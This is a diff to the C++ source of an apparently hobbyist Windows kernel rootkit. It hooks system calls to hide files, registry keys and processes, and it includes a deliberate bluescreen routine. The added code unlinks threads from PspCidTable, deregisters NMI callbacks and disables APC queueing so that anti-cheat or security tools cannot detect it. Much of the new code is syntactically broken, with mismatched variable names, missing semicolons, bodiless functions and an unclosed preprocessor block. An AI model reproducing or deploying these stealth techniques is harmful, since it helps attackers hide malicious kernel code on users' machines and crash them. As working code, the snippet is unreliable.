@@ -2,7 +2,7 @@
 #include "defs.hpp"
 #include "hook.hpp"
 #include "imports.hpp"
-
+#include "utils.hpp"
 //define global variables
 
 wchar_t dllpath;
@@ -68,7 +68,7 @@ VOID DriverUnload(PDRIVER_OBJECT DriverObject){
 //interger.QuadPArt *= DelayTime;
 
 VOID BSOD(){
-        KeBugCheckEx( //this triggers a bluescreen
+        KeBugCheckEx( 
             0xDEADDEAD,
             0, 0, 0, 0
         );
@@ -184,6 +184,125 @@ NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION( //Hooked NtQuerySystemINformat
     return status;
 }
 
+PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(const ULONG64* pHandleTable, const LONGLONG Handle)
+{
+    ULONGLONG v2; // rdx
+    LONGLONG v3; // r8
+     
+    v2 = Handle & 0xFFFFFFFFFFFFFFFC;
+    if (v2 >= *pHandleTable)
+        return 0;
+    v3 = *(pHandleTable + 1);
+    if ((v3 & 3) == 1)
+        return reinterpret_cast<PHANDLE_TABLE_ENTRY>(*reinterpret_cast<ULONG_PTR*>(v3 + 8 * (v2 >> 10) - 1) + 4 * (v2 & 0x3FF));
+    if ((v3 & 3) != 0)
+        return reinterpret_cast<PHANDLE_TABLE_ENTRY>(*reinterpret_cast<ULONG_PTR*>(*reinterpret_cast<ULONG_PTR*>(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF)) + 4 * (v2 & 0x3FF));
+    return reinterpret_cast<PHANDLE_TABLE_ENTRY>(v3 + 4 * v2);
+}
+
+DUMP_HEADER __dump_header;
+
+VOID DumpHeader()
+{
+  CONTEXT context = {0};
+  PDUMP_HEADER tmp = NULL;
+  PKDEBUGGER_DATA64 KdDebuggerDataBlock = NULL;+
+  Context.ContextFlags = CONTEXT_FUL;
+  RtlCaptureContext(&Context);
+#ifndef _WIN64
+#define DUMP_BLOCK_SIZE 0x20000
+#else
+#define DUMP_BLOCK_SIZE 0x40000
+  tmp = ExAllocatePool(NonPagedPool, DUMP_BLOCK_SIZE);
+  if (NULL != tmp)
+  {
+    UNICODE_STRING Function = RTL_CONSTANT_STRING(L"KeCapturePersistentThreadState");
+    auto pCapturePersistentThreadState = reinterpret_cast<void(*)(CONTEXT*, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, void*)>(MmGetSystemRoutineAddress(&function));
+    __int64 Return = pCapturePersistentThreadState(&Context, NULL, 0, 0, 0, 0, 0, tmp);
+    if (Return)
+    {
+#pragma warning(disable : 4133)
+      KdDebuggerDataBlock = (PKDEBUGGER_DATA64)tmp->KdDebuggerDataBlock;
+#pragma warning(default : 4133)
+      memcpy(&__dump_header, KdDebuggerDataBlock, sizeof(__dump_header))
+    }
+  }
+  ExFreePool(tmp);
+}
+
+ULONG64* resolve(const ULONG64 addressInstructions, const int opcodeBytes, int addressBytes)
+{
+  addressBytes += opcodeBytes;
+  const ULONG32 RelativeOffset = *reinterpret_cast<ULONG32*>(addressInstructions + opcodeBytes);
+  return reinterpret_cast<ULONG64*>(addressInstructions + RelativeOffset + addressBytes);
+}
+
+typedef BOOLEAN(*func)(const PHANDLE_TABLE, const HANDLE, const PHANDLE_TABLE_ENTRY);
+func ExDestroyHandle;
+
+PHANDLE_TABLE_ENTRY ogCidEntry;
+
+void DestroyPspCidTableEntry(const HANDLE threadId)
+{
+  ULONG64* phandleTable = reinterpret_cast<ULONG64*>(__dump_header->PspCidTable;)
+  const PHANDLE_TABLE_ENTRY pCidEntry = ExpLookupHandleTableEntry(pHandleTable, reinterpret_cast<LONGLONG>(threadId));
+  ogCidEntry = pCidEntry;
+  if (pCidEntry != NULL)
+  {
+    unsigned long long tmp;
+    unsigned long long ntoskrnl = utils::get_module_base("ntoskrnl.exe", &tmp);
+    const ULONG64* pExDestroyHandle = resolve(reinterpret_cast<ULONG64>(utils::find_pattern_image(ntoskrnl, "\x8B\x93\xAC\x05\x00\x00\x4C\x8B\xC0\x48\x8B\x00\x00\x00\x00\x00\xE8\x00\x00\x00\x00", "xxxxxxxxxxx?????x????", ".text")),17, 4);
+    ExDestroyHandle = reinterpret_cast<func>(pExDestroyHandle);
+    log_debug("Cid entry: %p", pCidEntry)
+    log_debug("ObjectPointerBits: %p", pCidEntry->ObjectPointerBits)
+    ExDestroyHandle(reinterpret_cast<PHANDLE_TABLE>(pHandleTable), threadId, pCidEntry);
+    if (pCidEntry->ObjectPointerBits == 0)
+    {
+      log_debug("Entry removed");
+      log_debug("ObjectPointerBits: %p", pCidEntry->ObjectPointerBits);
+    }
+  }
+}
+
+void** GetNmiCallbackListHead()
+{
+  //this is a bti half assed but it should return a pointer to a pointer to NmiCallbackListHead 
+  unsigned long long tmp;
+  unsigned long long ntoskrnl = utils::get_module_base("ntoskrnl.exe", &tmp);
+  void** NmiCallbackListHead = reinterpret_cast<void**>(resolve(utils::find_pattern_image(ntoskrnl, "\xE8\x00\x00\x00\x00\x48\x8B\x1D\x00\x00\x00\x00\x48\x8D\x15\x00\x00\x00\x00\x0F\xB6\xF8\xEB\x00", "x????xxx????xxx????xxxx?", ".text")), 15, 4);
+  return NmiCallbackListHead;
+}
+typedef struct _KNMI_HANDLER_CALLBACK
+{
+    struct _KNMI_HANDLER_CALLBACK* Next;
+    PNMI_CALLBACK Callback;
+    PVOID Context;
+    PVOID Handle;
+} KNMI_HANDLER_CALLBACK, *PKNMI_HANDLER_CALLBACK;
+
+
+void DeleteNmiCallbacks()
+{
+  //If KiNmiCallbackListHead does not point to anything it KeBugChecks so we only deregister thr ones after.
+  PKNMI_HANDLER_CALLBACK curr = *reinterpret_cast<PKNMI_HANDLER_CALLBACK>(GetNmiCallbackListHead())->Next;
+  while (true)
+  {
+    KeDeregisterNmiCallback(curr->Handle); //exported function.
+    if (curr->Next == NULL  || curr->Next == 0) return;
+    curr = curr->Next;
+  }
+}
+
+void HookInterruptController()
+
+void Restore(const HANDLE threadId)
+{
+  ULONG64* pHandleTable = reinterpret_cast<ULONG64*>(__dump_header->PspCidTable);
+  PHANDLE_TABLE_ENTRY pCidEntry = ExpLookupHandleTableEntry(pHandleTable, reinterpret_cast<LONGLONG>(threadId));
+  *pCidEntry = *ogCidEntry;
+  log_Debug("Cid Entry restored: %p", pCidEntry->ObjectPointerBits);
+}
+
 //Thanks a lot to "sam-b" on github for these some definitions used here!
 // This needs some fixing to do
 NTSTATUS NTAPI HOOKED_SYSTEM_HANDLE_INFORMATION_EX(
@@ -193,6 +312,7 @@ NTSTATUS NTAPI HOOKED_SYSTEM_HANDLE_INFORMATION_EX(
 )
 {
 //Again first call orginal etc
+//Not to sure if this is possible
   ULONG len = 20;
 	NTSTATUS status = (NTSTATUS)0xc0000004;
 	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
@@ -264,7 +384,30 @@ NTSTATUS NTAPI HookedZwEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALU
     return status;
 };
 
+struct OriginalFlags
+{
+  UCHAR ApcQueueable;
+}ogFLags;
+bool doOncePerBoot = TRUE;
 
+void DisableApcQueueable
+{
+  PKTHREAD pThread = KeGetCurrentThread();
+  if (doOncePerBoot)
+  {
+    ogFLags.ApcQueueable = pThread->ApcQueueable;
+    doOncePerBoot = False;
+  }
+  pThread->ApcQueueable = 0;
+}
+
+void RestoreApcQueueable()
+{
+  PKTHREAD pThread = KeGetCurrentThread();
+  pThread->ApcQueueable = ogFLags.ApcQueueable;
+}
+
+//Altough we could also spoof the NMI cllback table, most callbacks are registered right before firing NMIs so we couldnt delete the callback quick enough (I can tho if you guys want me to then please just report the issue)
 //Thanks to kxnan1337 on UnknownCheats
 NTSTATUS name2pid(PCWSTR executable_name, PHANDLE pOutHandle)
 {
@@ -316,20 +459,21 @@ NTSTATUS name2pid(PCWSTR executable_name, PHANDLE pOutHandle)
     return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
 }
 
-// I am not sure if you can do this to be honest so fix this by just using ZwQuerySysinfo
-BOOLEAN IsProcessRunning(const wchar_t *processName){
-    log_debug("Checking if process %s is running...", processName);
-    BOOLEAN exists = FALSE;
-    PEPROCESS process = NULL;
-    PEPROCESS current = PsGetNextProcess(NULL);
-
-    while (current){
-        const char* imageName = PsGetProcessImagefileName()
-        if (imageName == processName){
-            return TRUE;
-        }
-    }
+BOOLEAN IsProcessRunning(PCWSTR processName){
+	//Risky hack but anyways it works
+  ANSI_STRING ansiStr;
+  UNICODE_STRING uniStr;
+  RtlInitUnicodeString(&uniStr, processName);
+  if (!NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiStr, &uniStr, TRUE)))
+  {
+    log_debug("Failed to convert PCWSTR to ANSI_STRING.");
     return FALSE;
+  }
+	log_debug("Checking if Process %s is running...", ansiStr.Buffer);
+  RtlFreeAnsiString(&ansiStr);
+	HANDLE tmp;
+	if (name2pid(processName, &tmp) == STATUS_NOT_FOUND) return FALSE;
+	return TRUE;
 }
 
 /*
@@ -364,7 +508,24 @@ void __fastcall HideFIles_callback(unsigned long ssdt_index, void** ssdt_address
     if (*ssdt_address == g_QueryDir) *ssdt_address = HOOKED_NtQueryDirectoryFile;
 }
 
+NTSTATUS SysQueryHandler()
 
+void __fastcall kHookCallback(unsigned long long ssdt_index, void** ssdt_address)
+{
+  UNREFERENCED_PARAMETER(ssdt_index);
+  switch (*ssdt_address)
+  {
+    case g_EnumKey:
+      *ssdt_address = HookedZwEnumerateKey;
+      break;
+    case g_EnumValKey:
+      *ssdt_address = HookedZwEnumerateValueKey;
+      break;
+    case g_QueryDir:
+      *ssdt_address = HOOKED_NtQueryDirectoryFile;
+      break;
+  }
+}
 
 BOOLEAN stopThread = FALSE;
 void BsodThread(
@@ -572,7 +733,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, 
             }
         }
 
-        NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, KstartRoutine, NULL); //I honestly forgot why and I dont feel like figuring it out
+        NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, KstartRoutine, NULL);
         if (!NT_SUCCESS(status)){
             log_debug("Failed to create a thread.");
             return status;
